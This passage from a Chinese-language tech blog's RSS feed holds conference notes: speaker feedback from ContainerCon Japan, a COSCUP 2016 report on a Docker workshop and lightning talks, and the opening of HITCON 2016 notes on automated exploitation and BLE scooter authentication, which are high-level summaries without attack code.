&lt;p&gt;想當初修 SA 的時候 flash player 在 FreeBSD 上編不起來好像就是用這招。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;幕後花絮&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;How to implement the &lt;code&gt;is_freebsd_container()&lt;/code&gt; function?  &lt;/li&gt;
&lt;li&gt;How was the ContainerCon Japan?  &lt;ul&gt;
&lt;li&gt;跟當地的社群互動滿有趣的  &lt;/li&gt;
&lt;li&gt;會議室比較高級、沒有 host、會幫你準備好投影機、白板。  &lt;/li&gt;
&lt;li&gt;講者：「我覺得可以考慮不要去。」 （眾：XDDDD）  &lt;ul&gt;
&lt;li&gt;「裏面有一半以上的講者是日本人，腔調不是問題，主要是單位時間內的資訊密度，很多講者為了把發音腔調正確會講得很慢。」  &lt;ul&gt;
&lt;li&gt;jserv: 「日本砸了很多錢在這上面，所以有一半以上的講者是日本人很正常的。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「然後很多講者的問答時間都沒有人理。」  &lt;ul&gt;
&lt;li&gt;jserv: 「他們可能都已經在公司聽過同事講過完整的日文版了，只是來這邊聽比較沒那麼完整的英文版。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「日本人用 Twitter 用很兇，有位老老的日本人在我演講完後問了很多的問題，然後問我有沒有用 Twitter，把我加到了一個討論 Container 的 Group 裏面。我才發現他在聽我演講的時候發了很多推，然後這些推底下都有他的推友在討論，有提到 Execution domain，也有說我的某頁簡報毫無意義的評論，於是我用我沒那麼好的日文跟他們來來回回得回覆，但不知道是不是我的日文用字拿捏的不好，隔天我發現他們全都取消追蹤我而且還把我踢出那個討論 container 的 group。」  &lt;ul&gt;
&lt;li&gt;xatier：「一定是沒跟他們喝酒的關係，日本人都是喝了酒馬上就熟了。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「有位中國人看到我投影片的第一頁，就跑過來問我說：『你清華的啊？』『嗯，但我是臺灣的清華』然後他就當著我的面拿著他的東西走出去了。」  &lt;ul&gt;
&lt;li&gt;jserv：「你下次遇到這種就要直接跟他講英文，他跟你用中文你還是一直跟他說英文，不然像你這樣整個就弱掉了。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;覺得 jserv 後來跟講者講的一些東西也頗值得紀錄一下的：  &lt;ul&gt;
&lt;li&gt;「你去了 Linux Foundation 辦的 Conference 一趟應該就知道當講者的不是超級大的公司就是超級小的公司，像你這種只有學生身份的是非常少的。」「對啊，有位和我討論的德國人也有聊到，他直接就說他覺得是主辦單位找不到足夠的講者才找我。」「也好啦，至少是一次出去看看的經驗。」  &lt;/li&gt;
&lt;li&gt;「看到滿多人說我的演講跟他們預期的有落差。」「你這次去就知道他們都是業界的工程師，你的摘要就輸人家了，人家 Twitter 是講幾萬台伺服器的佈署、Facebook 是講二十億使用者的資料分析」「對啊，我講的東西根本沒有 scale。」「他們很多人是公司出錢讓他們來的，最便宜的門票一張也要五百多鎂，你講的東西太空洞讓他們沒辦法寫報告的話，交不出報告就會被主管罵。」  &lt;/li&gt;
&lt;li&gt;「你的題目是還不錯，開始演講時的高度是在這，但你講完以後高度只有上升一點點。」「程式碼的部份放的太少算是我的失策。」「你的簡報太早做完了，你應該在聽完第一場 keynote 的時候就會知道日本這邊大概喜歡怎麼樣的簡報，你就要在這個時候開始修改你的簡報。」「哦對，日本人好像超級喜歡格言，看到有一個 keynote 講者，一開始的十張投影片全部都是格言然後搭配文青風格的照片背景，滿受大家歡迎的。」  &lt;/li&gt;
&lt;li&gt;「你這個演講就是缺乏應用的部份，因為參加的都是真的在業界的工程師，所以他們會希望看到你講的東西解決了什麼問題，如果沒有這部份的話，只會讓他們覺得『靠，又是一個窮學生來這邊講論文。』我覺得你這個可以考慮弄個 IDS，因為 syscall 都是抽換掉的，所以不用怕，甚至可以重現一堆 CVE，來分析攻擊者的行為。」「對耶，滿多人後來反應演講跟預期有落差的時候，我就有聽到我後面的人在用日語說『原來是學生而且還是做 High Performance Computing 又不是研究 Container 的，難怪』之類的。」「下次你就要問問看有沒有公司願意讓你掛名，你就可以放在投影片上，這樣就比較不會被這些業界的工程師看不起，你的英文表達能力基本上已經超過他們一半在場的日本工程師啦。」  &lt;/li&gt;
&lt;li&gt;「演講就是要安排暗樁啊，不然聽眾很容易聽到睡著的。像你的演講是第三天的上午，前面兩天就要儘量去認識人，然後跟他們稍微賣點關子，請他們來聽你的演講。」  &lt;/li&gt;
&lt;li&gt;「Linux Foundation 對於演講順序的安排是有根據的，不只是演講的內容，也會去查一下這個講者的影響力還有做了哪些事情，評價愈高的當然就是 keynote spearker。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Wed, 21 Sep 2016 03:50:25 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-09-21:posts/2016/09/21/cat-system-workshop-11-dynamically-hacking-the-kernel-with-containers/</guid><category>Kernel</category><category>Containers</category><category>Cat System Workshop</category><category>Meetup</category></item><item><title>COSCUP 2016</title><link>https://blog.m157q.tw/posts/2016/08/25/coscup-2016/</link><description>&lt;h1&gt;INFO&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Official website: &lt;a href="http://coscup.org/2016"&gt;http://coscup.org/2016&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Note: &lt;a href="http://beta.hackfoldr.org/coscup2016"&gt;http://beta.hackfoldr.org/coscup2016&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 1: 2016/08/20 Sat&lt;/h1&gt;
&lt;p&gt;早上其實沒聽什麼議程，&lt;br /&gt;
先隨便逛了一下攤位，&lt;br /&gt;
在VLC 的攤位待了一下子，&lt;br /&gt;
之前好像沒看過 VLC 來 COSCUP，&lt;br /&gt;
跟兩個法國人聊天，&lt;br /&gt;
還吃了法國來的糖果，&lt;br /&gt;
拿了一張 VLC 的貼紙，&lt;br /&gt;
對於沒有實體交通錐覺得有點小遺憾（？）&lt;br /&gt;
&lt;img alt="vlc" src="/files/coscup-2016/vlc.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;然後隔壁的 MOPCON 攤位很應 Pokemon GO 的景，&lt;br /&gt;
讓大家有神奇寶貝可以收服 XD&lt;br /&gt;
&lt;img alt="mopcon-pokemon" src="/files/coscup-2016/mopcon-pokemon.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;後來一直待在天瓏攤位翻書，&lt;br /&gt;
畢竟平常沒有跑天瓏實體書店的習慣，&lt;br /&gt;
而且 Conf 擺攤的折扣又比會員卡還便宜，&lt;br /&gt;
加上今年開始工作以後，&lt;br /&gt;
買書終於可以不用像以前因為價錢而猶豫不決，&lt;br /&gt;
所以今年 PyCon, HITCON 的時候都有到天瓏攤位買書，&lt;br /&gt;
一次大概買三到四本左右，&lt;br /&gt;
&lt;a href="https://twitter.com/M157q/status/766861133231759361"&gt;結果這次又買就被老闆記住了 XD&lt;/a&gt;&lt;br /&gt;
反正想說在 Conf 買比較便宜，&lt;br /&gt;
而且最近每年大概也只固定跑 PyCon, HITCON, COSCUP 這三場 Conf，&lt;br /&gt;
先買些書囤起來，&lt;br /&gt;
之後再看應該不為過吧？&lt;br /&gt;
只是每天花在閱讀實體書的時間要再增加了，（畢竟今年的目標可是多閱讀實體書啊）&lt;br /&gt;
最近比較沒有撥時間出來閱讀。（一定都是 Pokemon GO 的錯）&lt;br /&gt;
&lt;img alt="tenlong" src="/files/coscup-2016/tenlong.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;13:15~16:00 Docker 進階工作坊&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Slides: &lt;a href="https://docs.google.com/presentation/d/1yABG8gVJlzWMQnEAOJnMpFRoEXeDACnCHFR7HmFDWaA/pub?start=false&amp;amp;loop=false&amp;amp;delayms=3000&amp;amp;slide=id.p"&gt;https://docs.google.com/presentation/d/1yABG8gVJlzWMQnEAOJnMpFRoEXeDACnCHFR7HmFDWaA/pub?start=false&amp;amp;loop=false&amp;amp;delayms=3000&amp;amp;slide=id.p&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Hands-on Lab: &lt;a href="https://github.com/philipz/docker_workshop"&gt;https://github.com/philipz/docker_workshop&lt;/a&gt;  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="https://www.katacoda.com/docker/courses/docker2016/1"&gt;Docker 官方 Web 投票微服務範例&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.katacoda.com/philipz/scenarios/7"&gt;Docker Compose &amp;amp; CircleCI&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.katacoda.com/philipz/scenarios/2"&gt;Node.js 最精簡映像檔建置&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/#/onbuild"&gt;Dockerfile ONBUILD&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;An ONBUILD command executes after the current Dockerfile build completes. ONBUILD executes in any child image derived FROM the current image. Think of the ONBUILD command as an instruction the parent Dockerfile gives to the child Dockerfile.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.katacoda.com/docker/courses/docker2016/2"&gt;Docker Compose 和 Service Discovery&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;會眾反應：Docker Network 在 Docker 1.9 的時候，40G 的網路可以用到 30G，但到 Docker 1.12 的時候，只能用到 3G 多。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.katacoda.com/docker/courses/docker2016/4"&gt;Docker Compose for MySQL Cluster &amp;amp; WordPress&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://galeracluster.com/products/"&gt;Galera Cluster&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Galera Cluster for MySQL is  a true Multimaster Cluster based on synchronous replication. Galera Cluster is an easy-to-use, high-availability solution, which provides high system uptime, no data loss and scalability for future growth.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Docker-compose 用 cluster 的時候要注意 depends-on 的順序  &lt;/li&gt;
&lt;li&gt;Azure 西歐的機房在荷蘭  &lt;/li&gt;
&lt;li&gt;DB 要設定 volumes 才能永久儲存資料，否則 container 一關掉，DB 的資料也會不見。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://www.katacoda.com/philipz/courses/swarm/1"&gt;Docker 1.12 Swarm 和 MySQL Cluster &amp;amp; WordPress&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Docker Swarm  &lt;ul&gt;
&lt;li&gt;Managers (Raft consensus group), Workers (Gossip Network), gRPC  &lt;/li&gt;
&lt;li&gt;Mesh Network  &lt;/li&gt;
&lt;li&gt;會眾反應：之前有遇過用 Docker Swarm 然後出問題，用了 swarm left 然後把 node 砍掉，再把 Docker 相關的東西全部移除，之後重裝 Docker 和 Docker Swarm，發現設定檔仍舊是出問題的那個，並沒有被重裝，所以想請問 Managers 的設定檔到底是存在實體機器的哪裡？（A：不知道，可能要去看 Source code，也可以去 Docker 的 github 發個 issue 反應一下。）  &lt;/li&gt;
&lt;li&gt;Manager 數量建議為三台以上，原因請見&lt;a href="http://www.twword.com/wiki/%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%B0%87%E8%BB%8D%E5%95%8F%E9%A1%8C"&gt;拜占庭將軍問題&lt;/a&gt;，由 Leslie Lamport 所提出。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://www.katacoda.com/philipz/scenarios/8"&gt;Serverless 架構 &amp;amp; Docker (DockerCon 2016 Hackathon 作品)&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;nvidia-docker run -it --rm -p 8888:8888 tensorflow/tensorflow:nightly-gpu&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;nvidia-docker 會幫你把 GPU 掛載到 docker 裏面。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有獎徵答  &lt;ul&gt;
&lt;li&gt;Docker Network 在 Docker 1.9.0 以後出現  &lt;/li&gt;
&lt;li&gt;Docker Swarm 的 Worker 是在 Docker 1.12 以後出現的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;這場 workshop 的內容個人覺得算蠻充實的，&lt;br /&gt;
（好像滿多沒聽過 Docker 的新手跑來聽，結果跟不上就中途離席了 XD）&lt;br /&gt;
我也差點跟不太上，畢竟跟 Docker 還沒有到很熟...  &lt;/p&gt;
&lt;p&gt;講者的簡報內容都是公開的，&lt;br /&gt;
覺得這種作法還挺不錯的，&lt;br /&gt;
有興趣的人點選上面的連結自己閱讀就行了。  &lt;/p&gt;
&lt;p&gt;因為講者是 O'REILLY 的 《Docker 錦囊妙計》的譯者，&lt;br /&gt;
所以現場贈送五本，&lt;br /&gt;
因為題目挺簡單的，&lt;br /&gt;
所以就舉手拿了一本，&lt;br /&gt;
本來打算在天瓏攤位買的，&lt;br /&gt;
於是就賺到一本書了。&lt;br /&gt;
&lt;img alt="docker" src="/files/coscup-2016/docker.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;《寫出高性能的服務與應用。那些你沒想過的事！》 by 小傑&lt;/h2&gt;
&lt;p&gt;Docker workshop 結束後就跑來聽小傑學長的 talk，&lt;br /&gt;
發現 IRC 上好多人都說根本是在複習大學的 OS，&lt;br /&gt;
還有人說這是不是 Synology 的面試題目，&lt;br /&gt;
覺得大家好毒呀，&lt;br /&gt;
可能是我大學 OS 沒學好，&lt;br /&gt;
我覺得複習一下也挺不錯的。&lt;br /&gt;
但也可能是因為題目下的有點內容農場式，&lt;br /&gt;
結果大家發現內容不如預期吧？&lt;br /&gt;
果然標題還是下的腳踏實地一點比較好。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Lightning talks&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;發現好多認識的人都上去講了，&lt;br /&gt;
但我好像還沒講過哪一場 Conf 的 Lightning talk，&lt;br /&gt;
也沒在 R0 給過 talk，&lt;br /&gt;
也許該找個機會解鎖成就一下。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因為沒有現場筆記，&lt;br /&gt;
所以就照記憶中的狀況紀錄一下吧，&lt;br /&gt;
不一定會照順序。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RS 的自幹 VR Pokemon GO  &lt;/li&gt;
&lt;li&gt;tnlin 的 PokemonGo-TSP  &lt;/li&gt;
&lt;li&gt;Denny 的瘋狂走路瘦身法  &lt;/li&gt;
&lt;li&gt;Pellaeon 的臺灣程式路跑  &lt;/li&gt;
&lt;li&gt;蒼時的爸媽都認不得的 Ruby  &lt;/li&gt;
&lt;li&gt;中國來的會眾找人幫忙把 RMS 的 《Free Software, Free Society》中文化  &lt;ul&gt;
&lt;li&gt;想到我這本買了給 RMS 簽名，但只看一點點就沒看了，到現在還沒看完...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;兩分鐘打臉 MTK  &lt;ul&gt;
&lt;li&gt;覺得這個最猛，只改兩行 code 就讓 MTK 的 LinkIt Smart 7688 同時支援 AP mode 跟 client mode，根本充份顯示了企業的程式碼應該要開源的重要性，不然使用者遇到問題根本沒有機會自己改。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;V字龍的臺灣社群非官方客製版 Ubuntu 作業系統  &lt;ul&gt;
&lt;li&gt;覺得這個還蠻棒的耶，不然臺灣自由軟體的中文化這塊真的幾乎快要沒人弄了，而且還自己先修了一些還沒被 upstream merge 的 bug，雖然我現在沒在用 Ubuntu 了，這個真的蠻值得支持的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;pyclub - pycontw code sprint 的宣傳  &lt;/li&gt;
&lt;li&gt;交大丁戊組的工商服務  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;BoF&lt;/h2&gt;
&lt;p&gt;看到廠商攤位上有一張很神奇的履歷調查問卷，&lt;br /&gt;
Slack 跟 Trello 算在專業技能裏面。&lt;br /&gt;
&lt;img alt="resume" src="/files/coscup-2016/resume.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;然後依照慣例就是披薩跟可樂吃到飽。&lt;br /&gt;
&lt;img alt="pizza" src="/files/coscup-2016/pizza.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;跑去 CTLUG x openSUSE x RailsFun，&lt;br /&gt;
看到了有點久沒看到的 JC，&lt;br /&gt;
還從他那邊拿到了很有趣的自製木牌避邪符，&lt;br /&gt;
真的是目前遇過亂點技能樹最強的傢伙。&lt;br /&gt;
&lt;img alt="amulet" src="/files/coscup-2016/amulet.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;之後就和小趴還有喜德去各個 BoF 亂晃，&lt;br /&gt;
然後臨時和雨蒼還有其他幾個人臨時組一個 Pokemon GO BoF，&lt;br /&gt;
跑去外面抓呆呆獸（被它逃走了QQ）、電擊獸、迷你龍  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 2: 2016/08/21 Sun&lt;/h1&gt;
&lt;h2&gt;用 JS 自幹（鋼鐵人電影裡頭的）Jarvis by 李慕約&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://sheethub.github.io/smartcity2016/map/map2.5d.html"&gt;https://sheethub.github.io/smartcity2016/map/map2.5d.html&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;應該是用 &lt;a href="https://cloud.google.com/speech/"&gt;GCP 的 Speech API&lt;/a&gt;?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Heilmeier Questions  &lt;ul&gt;
&lt;li&gt;是這個？ &lt;a href="http://www.design.caltech.edu/erik/Misc/Heilmeier_Questions.html"&gt;http://www.design.caltech.edu/erik/Misc/Heilmeier_Questions.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Debater 辯論家：網路筆戰大亂鬥 by ETBlue&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ETBlue/debater"&gt;https://github.com/ETBlue/debater&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Related links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ETBlue/gw2inventory"&gt;https://github.com/ETBlue/gw2inventory&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;開放公司文化之下的軟體開發 / 如何用開源軟體賺錢？ by 翟本喬&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;「要怎麼解決這個問題呢?」 政府：「辦一個比賽。」  &lt;ul&gt;
&lt;li&gt;笑著笑著就哭了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「還好我們沒有中華民國奧林匹克開源軟體協會。」  &lt;/li&gt;
&lt;li&gt;LibreOffice  &lt;/li&gt;
&lt;li&gt;ownCloud  &lt;/li&gt;
&lt;li&gt;S3QL  &lt;/li&gt;
&lt;li&gt;和沛如何用開源軟體？  &lt;ul&gt;
&lt;li&gt;觀察客戶要什麼  &lt;/li&gt;
&lt;li&gt;加上重要功能  &lt;/li&gt;
&lt;li&gt;願意自己重寫  &lt;/li&gt;
&lt;li&gt;甚至徹底改變商業模式  &lt;/li&gt;
&lt;li&gt;建置世界級的大系統  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;找到使用者的痛，並解決它。  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;真的覺得應該要一直強調一點：&lt;br /&gt;
參與開源軟體真的不能只停留在使用者&lt;br /&gt;
要讓每一位參與者都要有自己的貢獻是不可或缺的自覺&lt;br /&gt;
不一定只侷限在寫程式&lt;br /&gt;
不管是工作人員、翻譯或是其他跟 Open Source 有關的活動都是需要的&lt;br /&gt;
真的不能只停留在一年參加一次 Conf 看人家演講&lt;br /&gt;
每一個人都可以讓臺灣在 Open Source 界被其他國家看見  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Lightning talks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;othree: 用 git 線圖來畫臺北捷運路網  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/othree/taipei-mrt"&gt;https://github.com/othree/taipei-mrt&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;用完以後我更懂 git branch 跟 git log 了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;jackymaxj: HackMD  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://hackmd.io/p/HyTkWyJF#/"&gt;https://hackmd.io/p/HyTkWyJF#/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackmd.io/"&gt;https://hackmd.io/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;海豹：SITCON HK  &lt;ul&gt;
&lt;li&gt;今年十月  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;徵音梅林新歌發表 - YChao  &lt;ul&gt;
&lt;li&gt;三天三夜！  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;三分鐘送 first kernel patch - louielu  &lt;/li&gt;
&lt;li&gt;報到 App 的開發秘辛 - Denny Huang  &lt;/li&gt;
&lt;li&gt;Chinese Character - DaeHyun Sung  &lt;ul&gt;
&lt;li&gt;韓國講者  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://telegram.me/cjkvBot"&gt;https://telegram.me/cjkvBot&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;感覺好猛啊，reference 裡頭竟然有 O'REILLY 的 CJKV 的書，我也是前陣子幫 Pellaeon 拿書才發現 O'REILLY 竟然有出關於字型編碼的書，而且超大一本，內容涵蓋中文(C)、日文(J)、韓文(K)、越南文(V)。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Thoughts&lt;/h2&gt;
&lt;p&gt;不知道是因為開始工作了以後心境轉變了還是其他原因，&lt;br /&gt;
今年參加 Conf 沒有像以前聽那麼多議程了，&lt;br /&gt;
也沒有開 IRC、沒開共筆。&lt;br /&gt;
已經變成像以前社群長輩那樣，&lt;br /&gt;
參加 Conf 比較像是為了見見一陣子沒看到的朋友，&lt;br /&gt;
聊聊天、彼此交換一下資訊還有近況等等&lt;br /&gt;
也不知道是不是個好現象就是。  &lt;/p&gt;
&lt;p&gt;其實有想過，&lt;br /&gt;
如果有真的想聽的議程沒聽到的話，&lt;br /&gt;
還是可以會後自己去看錄影和簡報，&lt;br /&gt;
（甚至拿來在工作的時候聽也 OK，&lt;br /&gt;
畢竟現在工作的時候就會順便聽 Podcast 了。）&lt;br /&gt;
大概只有 HITCON 有些不願意公開錄影和簡報的需要當場聽。  &lt;/p&gt;
&lt;p&gt;然後現在都會儘量挑標題看起來比較不那麼浮誇和技術成份看起來比較多的 talk，&lt;br /&gt;
往往內容比較紮實，&lt;br /&gt;
而且人也比較少，&lt;br /&gt;
不會沒地方坐。&lt;br /&gt;
一開始來參加 Conf 的時候因為聽不太懂，&lt;br /&gt;
所以都會挑比較有表演性質或嘴炮的 talk 聽，&lt;br /&gt;
畢竟太難的就聽不懂了，&lt;br /&gt;
我想這是比較明顯的差別吧。  &lt;/p&gt;
&lt;p&gt;今年參加的時候不知道為何，&lt;br /&gt;
一直有種 COSCUP 2015 恍若昨日的感覺，&lt;br /&gt;
不知道是不是因為這一年過的不夠充實。&lt;br /&gt;
其實開始工作以後，&lt;br /&gt;
一直覺得工作比待在學校還輕鬆，&lt;br /&gt;
不知道是自己鬆懈了，&lt;br /&gt;
還是工作內容的問題，&lt;br /&gt;
我想這是自己下半年要調整的方向吧。  &lt;/p&gt;
&lt;p&gt;然後希望從今年開始，&lt;br /&gt;
以後參加 COSCUP 都跟這次一樣要拿開源貢獻者的票，&lt;br /&gt;
其實之前有想過，&lt;br /&gt;
以後參加 Conf 要不要都給自己設下一定要投稿甚至當講者才能去的規則，&lt;br /&gt;
我想就拿這個目標努力吧。  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Thu, 25 Aug 2016 10:15:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-08-25:posts/2016/08/25/coscup-2016/</guid><category>COSCUP</category></item><item><title>HITCON 2016 CMT</title><link>https://blog.m157q.tw/posts/2016/07/23/hitcon-2016-cmt/</link><description>&lt;h1&gt;Day 1 (2016/07/22 Fri)&lt;/h1&gt;
&lt;h2&gt;Keynote / 從人工搶旗到機器人攻防（From CTF to CGC) 談資安人才培育&lt;/h2&gt;
&lt;h3&gt;Speaker: 交通大學資訊技術服務中心 黃世昆 Shih-Kun Huang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CGC (Cyber Grand Challenge)  &lt;ul&gt;
&lt;li&gt;CQE  &lt;/li&gt;
&lt;li&gt;CFE  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ForAllSecure CRS  &lt;ul&gt;
&lt;li&gt;Symbolic Fuzzer =&amp;gt; 深、慢  &lt;/li&gt;
&lt;li&gt;Random Fuzzer =&amp;gt; 淺、快  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CRS Integration Attack  &lt;ul&gt;
&lt;li&gt;Target-aware symbolic fuzzing  &lt;/li&gt;
&lt;li&gt;測、脅、隱、控  &lt;ul&gt;
&lt;li&gt;Fuzzing, Exploit, Anti-mitigation, Post-exploitation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CRS Integration Defense  &lt;/li&gt;
&lt;li&gt;CRAX - World Second Auto Exploitation Generator (Simple Live Demo)  &lt;ul&gt;
&lt;li&gt;Symbolic Execution  &lt;/li&gt;
&lt;li&gt;Concolic Execution  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Hacker's Tool Chain  &lt;ul&gt;
&lt;li&gt;Bug Fuzzzer  &lt;/li&gt;
&lt;li&gt;Crash Detector / Failure Monitor  &lt;/li&gt;
&lt;li&gt;Exploit Code Generator  &lt;ul&gt;
&lt;li&gt;目前缺少的一塊  &lt;/li&gt;
&lt;li&gt;目前分辨 Hacker 跟 Script Kiddie 的差別就在於會不會撰寫 Exploit，但要是之後 Exploit 能夠自動產生的話，Hacker 與 Script Kiddie 的分界就會消失，屆時 Hacker 又該以什麼為主要價值？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Shell-code Forger  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;物聯網 BLE 認證機制設計的挑戰：以 Gogoro Smart Scooter 為例&lt;/h2&gt;
&lt;h3&gt;Speaker:  GD&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Bluetooth 4.0 有三種  &lt;ul&gt;
&lt;li&gt;High Speed  &lt;/li&gt;
&lt;li&gt;Classic  &lt;/li&gt;
&lt;li&gt;Low Energy (BLE)  &lt;ul&gt;
&lt;li&gt;類似 HTTP：session-less 有七種 method  &lt;/li&gt;
&lt;li&gt;很容易控制  &lt;ul&gt;
&lt;li&gt;可以在捷運上讓旁邊的小米手環一直振動。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;很多物聯網裝置送的封包都沒加密  &lt;ul&gt;
&lt;li&gt;Security Manager Protocol  &lt;/li&gt;
&lt;li&gt;BLE 4.0 SMP 配對方式  &lt;ul&gt;
&lt;li&gt;Just Works: 沒有保護，很容易被 MITM 攻擊  &lt;/li&gt;
&lt;li&gt;Passkey Entry  &lt;/li&gt;
&lt;li&gt;Out-Of-Band  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BLE 4.0 隱私保護  &lt;ul&gt;
&lt;li&gt;硬體識別元 讀取限制  &lt;/li&gt;
&lt;li&gt;硬體識別元 亂數化  &lt;/li&gt;
&lt;li&gt;無硬體識別元，增加驗證機制設計的困難  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Gogoro smart scooter  &lt;ul&gt;
